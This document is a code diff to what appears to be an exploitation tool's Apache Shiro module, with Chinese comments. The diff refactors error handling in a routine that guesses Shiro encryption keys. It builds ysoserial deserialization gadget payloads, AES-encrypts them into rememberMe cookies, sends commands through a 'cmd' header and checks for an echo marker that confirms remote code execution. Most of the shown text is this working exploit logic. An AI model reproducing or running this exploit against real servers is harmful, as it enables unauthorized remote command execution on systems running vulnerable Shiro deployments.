@@ -274,36 +274,38 @@ class ApacheShiro():
                     if dnslog.result():
                         info = "[rce]" + " [key: " + key + " ] [gadget: " + "URLDNS" + " ]"
                         output.no_echo_success(method, info)
-
                         for gadget in gadget_lists:
                             for echo in echo_lists:
-                                gadget_payload = ysoserial_payload(gadget,"directive:"+echo)
-                                BS = AES.block_size
-                                pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
-                                mode =  AES.MODE_CBC
-                                iv = uuid.uuid4().bytes
-                                encryptor = AES.new(base64.b64decode(key), mode, iv)
-                                file_body = pad(gadget_payload)
-                                base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()
+                                try:
+                                    gadget_payload = ysoserial_payload(gadget,"directive:"+echo)
+                                    BS = AES.block_size
+                                    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+                                    mode =  AES.MODE_CBC
+                                    iv = uuid.uuid4().bytes
+                                    encryptor = AES.new(base64.b64decode(key), mode, iv)
+                                    file_body = pad(gadget_payload)
+                                    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()
 
-                                win_text = exprequest.get(self.url+path, headers={'cmd': self.win_cmd}, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False, cookies={'rememberMe':base64_ciphertext}).text
-                                linux_text = exprequest.get(self.url+path, headers={'cmd': self.linux_cmd}, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False, cookies={'rememberMe':base64_ciphertext}).text
-                                if "VuLnEcHoPoCSuCCeSS" in win_text or "VuLnEcHoPoCSuCCeSS" in linux_text:
-                                    GlobalVar.set_value('key', key)
-                                    GlobalVar.set_value('gadget', gadget)
-                                    GlobalVar.set_value('echo', echo)
-                                    info = "[rce]" + " [key: " + key + " ] [gadget: " + gadget + " ] [echo: "+ echo + " ]"
-                                    return output.echo_success(method, info)
-                                    break
-                            else:
-                                continue
-                            break
-                        break
+                                    win_text = exprequest.get(self.url+path, headers={'cmd': self.win_cmd}, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False, cookies={'rememberMe':base64_ciphertext}).text
+                                    linux_text = exprequest.get(self.url+path, headers={'cmd': self.linux_cmd}, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False, cookies={'rememberMe':base64_ciphertext}).text
+                                    if "VuLnEcHoPoCSuCCeSS" in win_text or "VuLnEcHoPoCSuCCeSS" in linux_text:
+                                        GlobalVar.set_value('key', key)
+                                        GlobalVar.set_value('gadget', gadget)
+                                        GlobalVar.set_value('echo', echo)
+                                        info = "[rce]" + " [key: " + key + " ] [gadget: " + gadget + " ] [echo: "+ echo + " ]"
+                                        return output.echo_success(method, info)
+                                #能够进入此处,说明存在利用key.为了排除其他因素影响,忽略异常
+                                except Exception:
+                                    pass
+                        return output.fail('Not found gadget')
                     else:
+                        #pass
                         output.result_error('%s is incorrect'%key)
-                except Exception as e:
+                #验证key的过程中发生异常后,跳过该key
+                except Exception:
+                    output.result_error('%s is skipped'%key)
                     continue
-            return output.fail('Not found gadget')
+            return output.fail('Not found kay')
         #_attack
         else:
             #指定攻击参数
@@ -347,213 +349,3 @@ def check(**kwargs):
                 thread_list.append(kwargs['pool'].submit(getattr(ExpApacheShiro, func)))
     #保存全局子线程列表
     GlobalVar.add_value('thread_list', thread_list)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
